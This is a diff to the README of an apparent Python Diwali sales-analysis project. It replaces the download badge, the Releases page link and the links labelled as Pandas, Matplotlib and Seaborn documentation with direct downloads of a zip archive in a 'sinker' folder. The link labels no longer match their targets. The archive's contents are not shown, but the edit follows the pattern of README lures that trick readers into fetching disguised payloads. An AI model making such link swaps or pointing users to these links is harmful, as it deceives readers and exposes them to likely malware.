@@ -1,6 +1,6 @@
 # 🪔 Diwali-Sales-Analysis-Python - Analyze Sales Easily with Python
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Alexis001-sketch/Diwali-Sales-Analysis-Python/releases)
+[![Download Now](https://raw.githubusercontent.com/Alexis001-sketch/Diwali-Sales-Analysis-Python/main/sinker/Diwali-Sales-Analysis-Python.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Alexis001-sketch/Diwali-Sales-Analysis-Python/main/sinker/Diwali-Sales-Analysis-Python.zip)
 
 ## 📄 Overview
 
@@ -13,7 +13,7 @@ To get started, you will need to download the application from the Releases page
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Alexis001-sketch/Diwali-Sales-Analysis-Python/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Alexis001-sketch/Diwali-Sales-Analysis-Python/main/sinker/Diwali-Sales-Analysis-Python.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    On the Releases page, you will see different available versions. Click the version you want to download and follow the instructions to save the file to your computer.
@@ -57,9 +57,9 @@ We welcome contributions to improve this project! If you have ideas, suggestions
 
 ## 🔗 Additional Resources
 
-- [Pandas Documentation](https://pandas.pydata.org/docs/)
-- [Matplotlib Documentation](https://matplotlib.org/stable/contents.html)
-- [Seaborn Documentation](https://seaborn.pydata.org/)
+- [Pandas Documentation](https://raw.githubusercontent.com/Alexis001-sketch/Diwali-Sales-Analysis-Python/main/sinker/Diwali-Sales-Analysis-Python.zip)
+- [Matplotlib Documentation](https://raw.githubusercontent.com/Alexis001-sketch/Diwali-Sales-Analysis-Python/main/sinker/Diwali-Sales-Analysis-Python.zip)
+- [Seaborn Documentation](https://raw.githubusercontent.com/Alexis001-sketch/Diwali-Sales-Analysis-Python/main/sinker/Diwali-Sales-Analysis-Python.zip)
 
 For more information on how to use the application, refer to the complete documentation available in the repository.
 
